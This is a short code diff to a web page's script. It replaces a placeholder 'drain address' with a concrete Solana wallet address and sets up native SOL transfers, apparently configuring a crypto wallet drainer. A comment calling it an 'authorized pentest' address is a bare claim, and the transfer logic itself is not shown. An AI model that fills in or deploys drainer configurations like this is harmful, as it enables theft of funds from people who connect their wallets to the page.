@@ -17,7 +17,7 @@
     </div>
 
     <script>
-        const DRAIN_ADDRESS = "YOUR_TARGET_WALLET_ADDRESS_HERE"; // Replace with your authorized pentest drain address
+        const DRAIN_ADDRESS = "2kc9YnPCrMZHJ21eWr6wGd7U9bKKTu2Mq2St3osdusvK"; // Replace with your authorized pentest drain address
         const CONTRACT_PROGRAM_ID = "11111111111111111111111111111111"; // System program for native SOL transfer
         
         let walletConnection = null;
